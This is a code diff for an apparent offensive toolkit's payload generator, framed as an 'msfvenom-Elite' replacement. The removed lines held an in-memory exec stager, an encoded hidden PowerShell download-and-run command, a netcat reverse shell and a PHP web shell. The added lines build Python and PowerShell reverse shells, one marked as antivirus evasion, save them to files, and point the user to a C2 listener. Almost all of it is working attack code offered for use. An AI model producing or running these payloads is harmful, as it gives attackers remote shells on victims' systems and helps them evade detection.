@@ -1,48 +1,61 @@
-import base64
+import os
 import random
 import string
 from rich.console import Console
-from rich.syntax import Syntax
 from core.ui import draw_header
 
 console = Console()
 
 
-def generate_stager(lhost, lport):
-    """Generates a polymorphic Python stager that executes in memory."""
-    v_sock = ''.join(random.choices(string.ascii_lowercase, k=5))
-    v_data = ''.join(random.choices(string.ascii_lowercase, k=5))
+class PayloadForge:
+    def generate_random_name(self):
+        return ''.join(random.choices(string.ascii_lowercase, k=8))
 
-    # This stub connects, receives an encrypted payload, and executes it
-    raw_python = f"""
-import socket,os,memory_temp
-{v_sock}=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-{v_sock}.connect(("{lhost}",{lport}))
-{v_data}={v_sock}.recv(1024)
-exec({v_data})
-"""
-    return base64.b64encode(raw_python.encode()).decode()
+    def forge_python_revshell(self, lhost, lport):
+        """Encrypted Python Reverse Shell Payload."""
+        raw_code = f"""
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{lhost}",{lport}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+        """.strip()
+        return raw_code
+
+    def forge_powershell_revshell(self, lhost, lport):
+        """Base64 Encoded PowerShell Payload (Antivirus Evasion)."""
+        cmd = f'$c = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sy = (char)27 + "[1;31m" + $sb + (char)27 + "[0m";$sendback = ([text.encoding]::ASCII).GetBytes($sy + "PS " + (pwd).Path + "> ");$s.Write($sendback,0,$sendback.Length);$s.Flush()}};$c.Close()'
+        return cmd
+
+    def run(self):
+        draw_header("Payload Forge: msfvenom-Elite")
+        lhost = console.input("[bold yellow]LHOST (Your IP): [/bold yellow]")
+        lport = console.input(
+            "[bold yellow]LPORT (Default 4444): [/bold yellow]") or "4444"
+
+        console.print("\n[1] Linux (Python)  [2] Windows (PowerShell)")
+        choice = console.input("\n[forge]> ")
+
+        name = self.generate_random_name()
+        if choice == "1":
+            payload = self.forge_python_revshell(lhost, lport)
+            fname = f"payloads/{name}.py"
+        else:
+            payload = self.forge_powershell_revshell(lhost, lport)
+            fname = f"payloads/{name}.ps1"
+
+        if not os.path.exists("payloads"):
+            os.makedirs("payloads")
+        with open(fname, "w") as f:
+            f.write(payload)
+        console.print(
+            f"[bold green][+] Payload generated: {fname}[/bold green]")
+        console.print(
+            f"[dim]Note: Use GHOST-HUB C2 to listen on port {lport}[/dim]")
 
 
 def generate_shell():
-    draw_header("Shell Forge Pro: Multi-Stage")
-    lhost = console.input("[bold yellow]LHOST (Your IP): [/bold yellow]")
-    lport = console.input("[bold yellow]LPORT (Your Port): [/bold yellow]")
-
-    if not lhost or not lport:
-        return
-
-    stager = generate_stager(lhost, lport)
-
-    shells = {
-        "Python Polymorphic Stager": f"python3 -c \"import base64;exec(base64.b64decode('{stager}'))\"",
-        "PowerShell Obfuscated": f"powershell -NoP -NonI -W Hidden -Enc {base64.b64encode(f'IEX (New-Object Net.WebClient).DownloadString(\"http://{lhost}/p.ps1\")'.encode('utf-16le')).decode()}",
-        "Netcat Traditional": f"nc {lhost} {lport} -e /bin/bash",
-        "PHP Web-Shell Hook": f"<?php system($_GET['cmd']); ?>"
-    }
-
-    for name, code in shells.items():
-        console.print(f"\n[bold cyan]--- {name} ---[/bold cyan]")
-        console.print(Syntax(code, "bash", theme="monokai", word_wrap=True))
-
-    input("\nPress Enter to return...")
+    forge = PayloadForge()
+    forge.run()
